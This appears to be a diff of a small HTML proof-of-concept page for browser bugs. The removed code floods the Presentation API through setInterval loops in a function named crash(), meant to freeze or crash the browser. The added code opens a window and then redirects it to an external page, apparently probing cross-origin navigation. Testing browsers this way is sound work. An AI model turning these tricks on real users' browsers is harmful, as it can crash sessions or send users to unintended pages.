@@ -1,31 +1,25 @@
 
-
 <!DOCTYPE html>
 <html>
-<meta charset="utf-8">
-
 <body>
-<button id="button_fuzz" onclick="start()">start</button>
 
+<h1>The Window Object</h1>
+<h2>The open() Method</h2>
 
-</body>
+<p>Click the button to open a new browser window.</p>
+
+<button onclick="myFunction()">Try it</button>
 
 <script>
-setTimeout('location.href = "#hello"', 10)
-function start() {
-setInterval("qPresentation1 = new PresentationRequest(['receiver/index.html']);qPresentation1.start().then(q=>{}).catch(q=>{})", 1)
-setInterval(function(){crash()}, 10)
+function myFunction() {
+ var x = window.open("https://www.google.com/csi");
 
-}
+   setTimeout(function(){x.location="https://lbstyle.github.io/alert.html"}, 1000)
 
-
-function crash() {
-setInterval("qPresentation1 = new PresentationRequest(['receiver/index.html']);qPresentation1.start().then(q=>{}).catch(q=>{})", 1);
 
 
 }
-
-
 </script>
 
+</body>
 </html>
